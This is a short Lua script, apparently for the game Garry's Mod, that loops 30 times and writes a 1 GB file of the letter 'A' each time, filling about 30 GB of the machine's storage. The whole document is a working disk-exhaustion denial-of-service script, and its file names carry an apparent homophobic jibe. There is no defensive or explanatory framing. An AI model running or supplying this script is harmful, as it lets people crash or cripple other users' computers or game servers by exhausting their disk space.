for i = 1, 30 do
    local f = file.Open("Igay_" .. i .. ".txt", "wb", "DATA")
    local block = string.rep("A", 1024 * 1024) -- 1 МБ
    for j = 1, 1024 do
        f:Write(block)
    end
    f:Close()
end
